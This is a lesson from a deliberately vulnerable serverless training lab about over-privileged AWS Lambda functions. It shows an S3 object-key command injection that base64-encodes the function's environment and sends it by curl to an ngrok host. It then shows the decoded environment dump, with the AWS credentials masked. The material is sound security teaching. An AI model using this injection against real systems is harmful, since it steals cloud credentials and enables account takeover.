# LESSON #7: Over-Privileged Function

Maybe one of the most fundamental security vulnerabilities in serverless applicaiton are over-privileged functions. [Previous research](https://www.protego.io/protego-labs-finds-nearly-all-serverless-application-functions-at-risk/) has found that almost all functions are configured with more permissions than what they actually need.

Let's see what we can do with that:

We already saw that one of the functions is vulnerable to command injection through an [insecure s3 configuration](../LESSONS/LESSON_04.md), so we can leverage that and steal the function's keys. By stealing the keys (AWS_SESSION_TOKEN, AWS_SECRET_ACCESS_KEY and AWS_ACCESS_KEY_ID), we will be able to assume the function's temporary execution role.

```
aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null_;b=`env|base64 --wrap=0`;curl 0c971764.ngrok.io?data=$b;echo x.raw' --profile hacker
```

It's not hard to find the relevant keys in the base64 string that we got:

![alt base64-keys]()

Decoding them (```echo <BASE64> | base64 --decode```) will reveal:
```
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/DVSA-SEND-RECEIPT-EMAIL
LAMBDA_TASK_ROOT=/var/task
LD_LIBRARY_PATH=/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
AWS_LAMBDA_LOG_STREAM_NAME=2018/12/23/[$LATEST]ce7961b403ba4b47806460db4bc62944
AWS_EXECUTION_ENV=AWS_Lambda_python2.7
AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000
AWS_LAMBDA_FUNCTION_NAME=DVSA-SEND-RECEIPT-EMAIL
PATH=/usr/local/bin:/usr/bin/:/bin:/opt/bin
SOURCE_EMAIL=tal+dvsa+noreply@protego.io
AWS_DEFAULT_REGION=us-east-1
PWD=/var/task
AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxI8g7+XkMv/6tuC7xxxxxxxxxx
LAMBDA_RUNTIME_DIR=/var/runtime
LANG=en_US.UTF-8
AWS_REGION=us-east-1
TZ=:UTC
ORDERS_TABLE=DVSA-ORDERS-DB
AWS_ACCESS_KEY_ID=ASIAYXXXXXXXXXXXXXXX
SHLVL=1
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2
_AWS_XRAY_DAEMON_PORT=2000
PYTHONPATH=/var/runtime
_X_AMZN_TRACE_ID=Root=1-5c20008f-d0654774095bf9f0cccb36e8;Parent=27d7de2b3f60098a;Sampled=0
AWS_SECURITY_TOKEN=XXXXXXXXXXXXXXX//////////wEaDAz8TBS...gBQ==
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
_HANDLER=lambda_function.lambda_handler
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=256
_=/usr/bin/env

```



